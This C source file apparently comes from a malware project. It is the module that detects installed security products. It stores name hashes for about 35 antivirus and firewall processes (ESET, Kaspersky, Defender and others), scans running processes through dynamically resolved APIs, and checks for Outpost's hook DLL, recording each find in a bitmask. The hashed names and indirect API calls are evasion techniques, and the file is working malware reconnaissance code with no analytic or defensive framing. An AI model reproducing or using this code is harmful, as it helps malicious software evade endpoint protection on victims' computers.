#define EKRN_EXE_HASH                0xd90a7896 // ekrn.exe  - ESET service process.
#define CCSVCHST_EXE_HASH            0x7ae72224 // ccSvcHst.exe - Symantec process.
#define SCHED_EXE_HASH               0x185ad196 // sched.exe - Avira Scheduler process.
#define AVP_EXE_HASH                 0x56028094 // avp.exe - Kaspersky Antivirus process.
#define AVASTSVC_EXE_HASH            0xfaab2424 // AvastSvc.exe - avast! Service.
#define MCSVHOST_EXE_HASH            0x3b0f2726 // McSvHost.exe - McAfee Service Host.
#define CMDAGENT_EXE_HASH            0xdb2f0321 // cmdagent.exe - COMODO Internet Security.
#define AVGWDSVC_EXE_HASH            0xba2b2825 // avgwdsvc.exe - AVG Watchdog Service.
#define AVGCSRVX_EXE_HASH            0x7bf31425 // avgcsrvx.exe - AVG Scanning Core Module - Server Part.
#define ACS_EXE_HASH                 0x56325a94 // acs.exe - Agnitum Outpost Service (Virus Buster).
#define DWSERVICE_EXE_HASH           0x3acf0829 // dwservice.exe - Dr.Web Control Service.
#define PFSVC_EXE_HASH               0xd862f098 // pfsvc.exe - Privatefirewall Network Service.
#define MSMPENG_EXE_HASH             0xbaa6dda3 // Antimalware Service Executable.
#define MSSECES_EXE_HASH             0x3b0ed1a3 // Microsoft Security Client User Interface.
#define ISWSVC_EXE_HASH              0xf8eaf3a5 // ZoneAlarm Browser Security.
#define PCTSSVC_EXE_HASH             0x3a8af4a5 // PC Tools Security Component.
#define JPF_EXE_HASH                 0x95627496 // jpf.exe - Jetico Personal Firewall Control Application.
#define BDAGENT_EXE_HASH             0xDB02D1A1 // bdagent.exe - Bitdefender Agent.
#define ADAWARESERVICE_EXE_HASH      0x23F5290D // AdAwareService.exe - Ad-Aware
#define ARCAMAINSV_EXE_HASH          0x5BF10D2C // ArcaMainSV.exe - ArcaVir
#define PSCTRLS_EXE_HASH             0xFB92CFA6 // PsCtrlS.exe - Panda
#define SAVSERVICE_EXE_HASH          0x0BB507A9 // SavService.exe - Performs virus scanning and disinfection functions.
#define SAVADMINSERVICE_EXE_HASH     0x601F28CE // SAVAdminService.exe - Sophos Admininistrator Service.
#define FSHOSTER32_EXE_HASH          0x27D2A2AE // fshoster32.exe - F-Secure Host Process
#define TPMGMA_EXE_HASH              0x587ADEA4 // tpmgma.exe - TrustPort Antivirus Management Agent
#define NPSVC32_EXE_HASH             0xD78A6DA2 // npsvc32.exe - Privacy Service.
#define INORT_EXE_HASH               0xD9B2E197 // InoRT.exe - eTrust Antivirus.
#define RSMGRSVC_EXE_HASH            0x7A8F20A6 // RsMgrSvc.exe - Rising
#define GUARDXSERVICE_EXE_HASH       0xE41A20EC // guardxservice.exe - GuardX Serivce (IKARUS)
#define SOLOSENT_EXE_HASH            0xDB971922 // SOLOSENT.EXE (Solo)
#define SOLOCFG_EXE_HASH             0xBAB6CCA2 // SOLOCFG.EXE (Solo)
#define TFSERVICE_EXE_HASH           0x3ACEFFAA // PCTool ThreatFire Serivce
#define BULLGUARDBHVSCANNER_EXE_HASH 0x92D2A910 // BullGuardBhvScanner - BullGuard Behavioural Scanner
#define CORESERVICESHELL_EXE_HASH    0xB009BBAE // CoreServiceShell.exe - Trend Micro Anti-Malware Solution Platform
#define K7TSMNGR_EXE_HASH            0x1A670B26 // K7TSMngr.exe - K7TotalSecurity Service Manager
#define SBAMSVC_EXE_HASH             0x1A66E1A5 // SBAMSvc.exe - Anti Malware Serivce.
#define INSSATT_EXE_HASH             0x1B7EEFA2 // GFI LanGuard Attendant Service.


#define PROACTIVE_NOT_CHECKED  0x4000000000000000ULL
#define PROACTIVE_NOT_DETECTED 0x8000000000000000ULL
#define HIPS_ESET       0x0000000000000001ULL
#define HIPS_SYMANTEC   0x0000000000000002ULL
#define HIPS_AVIRA      0x0000000000000004ULL
#define HIPS_KASPERSKY  0x0000000000000008ULL
#define HIPS_AVAST      0x0000000000000010ULL
#define HIPS_MCAFEE     0x0000000000000020ULL
#define HIPS_COMODO     0x0000000000000040ULL
#define HIPS_AVG        0x0000000000000080ULL
#define HIPS_OUTPOST    0x0000000000000100ULL
#define HIPS_DRWEB      0x0000000000000200ULL
#define HIPS_PRIVATEFW  0x0000000000000400ULL
#define HIPS_MSE        0x0000000000000800ULL
#define HIPS_ZONEALARM  0x0000000000001000ULL
#define HIPS_PCTOOLS    0x0000000000002000ULL
#define HIPS_JETICO     0x0000000000004000ULL
#define HIPS_BDEFENDER  0x0000000000008000ULL
#define HIPS_ADAWARE    0x0000000000010000ULL
#define HIPS_ARCAVIR    0x0000000000020000ULL
#define HIPS_PANDA      0x0000000000040000ULL
#define HIPS_SOPHOS     0x0000000000080000ULL
#define HIPS_FSECURE    0x0000000000100000ULL
#define HIPS_TRUSTPORT  0x0000000000200000ULL
#define HIPS_NORMAN     0x0000000000400000ULL
#define HIPS_ETRUST     0x0000000000800000ULL
#define HIPS_RISING     0x0000000001000000ULL
#define HIPS_IKARUS     0x0000000002000000ULL
#define HIPS_SOLO       0x0000000004000000ULL
#define HIPS_THREATFIRE 0x0000000008000000ULL
#define HIPS_BULLGUARD  0x0000000010000000ULL
#define HIPS_TRENDMICRO 0x0000000020000000ULL
#define HIPS_K7         0x0000000040000000ULL
#define HIPS_WINDFNDR   0x0000000080000000ULL
#define HIPS_VIPRE      0x0000000100000000ULL
#define HIPS_MAX_VALUE  0x2000000000000000ULL

uint64_t gHipsMask = 0;

BOOL ph_outpost_find_file(PWCHAR pwszPath, PWCHAR pwszFileName)
{
    WIN32_FIND_DATAW FindFileData;
    WCHAR wszSysPath[MAX_PATH];
    HANDLE hFind;

    __stosb((uint8_t*)wszSysPath, 0, MAX_PATH*2);
    fn_lstrcpyW(wszSysPath,pwszPath);
    fn_lstrcatW(wszSysPath,L"*");

    hFind = fn_FindFirstFileW(wszSysPath, &FindFileData);
    if (hFind == INVALID_HANDLE_VALUE) {
        //INLOG("FindFile() FindFirstFileW = INVALID_HANDLE_VALUE!", GetLastError());
        return FALSE;
    } 
    else {
        do {
            //INLOGX(FindFileData.cFileName,0);
            if (FindFileData.cFileName[0] != L'.') {
                if(FindFileData.dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY) {
                    __stosb((uint8_t*)wszSysPath, 0, MAX_PATH*2);
                    fn_lstrcpyW(wszSysPath, pwszPath);
                    fn_lstrcatW(wszSysPath, FindFileData.cFileName);
                    fn_lstrcatW(wszSysPath, L"\\");
                    if (ph_outpost_find_file(wszSysPath, pwszFileName))
                        return TRUE;
                }
                else {
                    if (fn_lstrcmpiW(FindFileData.cFileName,pwszFileName) == 0) {
                        return TRUE;
                    }
                }
            }
        } while (fn_FindNextFileW(hFind, &FindFileData) != 0);

        fn_FindClose(hFind);
    }

    return FALSE;
}

void ph_detect_outpost()
{
    WCHAR wszSysPath[MAX_PATH];
    HANDLE hOutpost;

    hOutpost = fn_GetModuleHandleW(L"wl_hook.dll");
    if (hOutpost != NULL) {
        DbgMsg(("Outpost detected with wl_hook.dll"));
        gHipsMask |= HIPS_OUTPOST;
        return;
    }

    //check 2
    fn_GetEnvironmentVariableW(L"SystemDrive", wszSysPath, MAX_PATH);
    fn_lstrcatW(wszSysPath, L"\\Program Files\\Agnitum\\");

    if (ph_outpost_find_file(wszSysPath, L"wl_hook.dll")) {
        DbgMsg(("Outpost detected with wl_hook.dll"));
        gHipsMask |= HIPS_OUTPOST;
    }
}

int hipsinfo_update()
{
    int ret = 1;
    PROCESSENTRY32W processEntry;
    HANDLE hSnap;

    // Пробегаемся по списку процессов и ищем совпадения с известными именами файлов проактивных защит.
    hSnap = fn_CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap != INVALID_HANDLE_VALUE) {
        processEntry.dwSize = sizeof(PROCESSENTRY32W);
        if (fn_Process32FirstW(hSnap, &processEntry)) {
            do {
                uint32_t hashVal = utils_strihash(processEntry.szExeFile);
                switch (hashVal) {
                    case EKRN_EXE_HASH:
                        gHipsMask |= HIPS_ESET;
                        DbgMsg(("ESET detected (PID: %u)", processEntry.th32ProcessID));
                        break;
                    case CCSVCHST_EXE_HASH:
                        gHipsMask |= HIPS_SYMANTEC;
                        DbgMsg(("Symantec detected (PID: %u)", processEntry.th32ProcessID));
                        break;
                    case SCHED_EXE_HASH:
                        gHipsMask |= HIPS_AVIRA;
                        DbgMsg(("Avira detected (PID: %u)", processEntry.th32ProcessID));
                        break;
                    case AVP_EXE_HASH:
                        gHipsMask |= HIPS_KASPERSKY;
                        DbgMsg(("KAV detected (PID: %u)", processEntry.th32ProcessID));
                        break;
                    case AVASTSVC_EXE_HASH:
                        gHipsMask |= HIPS_AVAST;
                        DbgMsg(("Avast detected (PID: %u)", processEntry.th32ProcessID));
                        break;
                    case MCSVHOST_EXE_HASH:
                        gHipsMask |= HIPS_MCAFEE;
                        DbgMsg(("McAfee detected (PID: %u)", processEntry.th32ProcessID));
                        break;
                    case CMDAGENT_EXE_HASH:
                        gHipsMask |= HIPS_COMODO;
                        DbgMsg(("COMODO detected (PID: %u)", processEntry.th32ProcessID));
                        break;
                    case AVGWDSVC_EXE_HASH:
                    case AVGCSRVX_EXE_HASH:
                        gHipsMask |= HIPS_AVG;
                        DbgMsg(("AVG detected (PID: %u)", processEntry.th32ProcessID));
                        break;
                    case ACS_EXE_HASH:
                        gHipsMask |= HIPS_OUTPOST;
                        DbgMsg(("Outpost detected (PID: %u)", processEntry.th32ProcessID));
                        break;
                    case DWSERVICE_EXE_HASH:
                        gHipsMask |= HIPS_DRWEB;
                        DbgMsg(("Dr.Web detected (PID: %u)", processEntry.th32ProcessID));
                        break;
                    case PFSVC_EXE_HASH:
                        gHipsMask |= HIPS_PRIVATEFW;
                        DbgMsg(("PrivateFirewall detected (PID: %u)", processEntry.th32ProcessID));
                        break;
                    case MSMPENG_EXE_HASH:
                    case MSSECES_EXE_HASH:
                        gHipsMask |= HIPS_MSE;
                        DbgMsg(("MSE detected (PID: %u)", processEntry.th32ProcessID));
                        break;
                    case ISWSVC_EXE_HASH:
                        gHipsMask |= HIPS_ZONEALARM;
                        DbgMsg(("ZoneAlarm detected (PID: %u)", processEntry.th32ProcessID));
                        break;
                    case PCTSSVC_EXE_HASH:
                        gHipsMask |= HIPS_PCTOOLS;
                        DbgMsg(("PC Tools detected (PID: %u)", processEntry.th32ProcessID));
                        break;
                    case JPF_EXE_HASH:
                        gHipsMask |= HIPS_JETICO;
                        DbgMsg(("Jetico detected (PID: %u)", processEntry.th32ProcessID));
                        break;
                    case BDAGENT_EXE_HASH:
                        gHipsMask |= HIPS_BDEFENDER;
                        DbgMsg(("BitDefender detected (PID: %u)", processEntry.th32ProcessID));
                        break;
                    case ADAWARESERVICE_EXE_HASH:
                        gHipsMask |= HIPS_ADAWARE;
                        DbgMsg(("Ad-Aware detected (PID: %u)", processEntry.th32ProcessID));
                        break;
                    case ARCAMAINSV_EXE_HASH:
                        gHipsMask |= HIPS_ARCAVIR;
                        DbgMsg(("ArcaVir detected (PID: %u)", processEntry.th32ProcessID));
                        break;
                    case PSCTRLS_EXE_HASH:
                        gHipsMask |= HIPS_PANDA;
                        DbgMsg(("Panda detected (PID: %u)", processEntry.th32ProcessID));
                        break;
                    case SAVSERVICE_EXE_HASH:
                    case SAVADMINSERVICE_EXE_HASH:
                        gHipsMask |= HIPS_SOPHOS;
                        DbgMsg(("Sophos detected (PID: %u)", processEntry.th32ProcessID));
                        break;
                    case FSHOSTER32_EXE_HASH:
                        gHipsMask |= HIPS_FSECURE;
                        DbgMsg(("F-Secure detected (PID: %u)", processEntry.th32ProcessID));
                        break;
                    case TPMGMA_EXE_HASH:
                        gHipsMask |= HIPS_TRUSTPORT;
                        DbgMsg(("TrustPort detected (PID: %u)", processEntry.th32ProcessID));
                        break;
                    case NPSVC32_EXE_HASH:
                        gHipsMask |= HIPS_NORMAN;
                        DbgMsg(("Norman detected (PID: %u)", processEntry.th32ProcessID));
                        break;
                    case INORT_EXE_HASH:
                        gHipsMask |= HIPS_ETRUST;
                        DbgMsg(("eTrust detected (PID: %u)", processEntry.th32ProcessID));
                        break;
                    case RSMGRSVC_EXE_HASH:
                        gHipsMask |= HIPS_RISING;
                        DbgMsg(("Rising detected (PID: %u)", processEntry.th32ProcessID));
                        break;
                    case GUARDXSERVICE_EXE_HASH:
                        gHipsMask |= HIPS_IKARUS;
                        DbgMsg(("IKARUS detected (PID: %u)", processEntry.th32ProcessID));
                        break;
                    case SOLOSENT_EXE_HASH:
                    case SOLOCFG_EXE_HASH:
                        gHipsMask |= HIPS_SOLO;
                        DbgMsg(("SoloAV detected (PID: %u)", processEntry.th32ProcessID));
                        break;
                    case TFSERVICE_EXE_HASH:
                        gHipsMask |= HIPS_THREATFIRE;
                        DbgMsg(("ThreatFire detected (PID: %u)", processEntry.th32ProcessID));
                        break;
                    case BULLGUARDBHVSCANNER_EXE_HASH:
                        gHipsMask |= HIPS_BULLGUARD;
                        DbgMsg(("BullGuard detected (PID: %u)", processEntry.th32ProcessID));
                        break;
                    case CORESERVICESHELL_EXE_HASH:
                        gHipsMask |= HIPS_TRENDMICRO;
                        DbgMsg(("TrendMicro detected (PID: %u)", processEntry.th32ProcessID));
                        break;
                    case K7TSMNGR_EXE_HASH:
                        gHipsMask |= HIPS_K7;
                        DbgMsg(("K7 detected (PID: %u)", processEntry.th32ProcessID));
                        break;
                    case SBAMSVC_EXE_HASH:
                    case INSSATT_EXE_HASH:
                        gHipsMask |= HIPS_VIPRE;
                        DbgMsg(("Vipre detected (PID: %u)", processEntry.th32ProcessID));
                        break;

                }
            } while(fn_Process32NextW(hSnap, &processEntry));
        }
        else {
            DbgMsg(("hipsinfo_update: Process32First failed with %08X", fn_GetLastError()));
            ret = 0;
        }
        fn_CloseHandle(hSnap);
    }
    else {
		DbgMsg(("hipsinfo_update: CreateToolhelp32Snapshot failed with %08X", fn_GetLastError()));
        ret = 0;
    }

    if (gHipsMask == 0ULL) {
        ph_detect_outpost();
    }

    if (gHipsMask == 0ULL) {
        gHipsMask = HIPS_MAX_VALUE;
        DbgMsg(("HIPS not found!"));
    }
    return ret;
}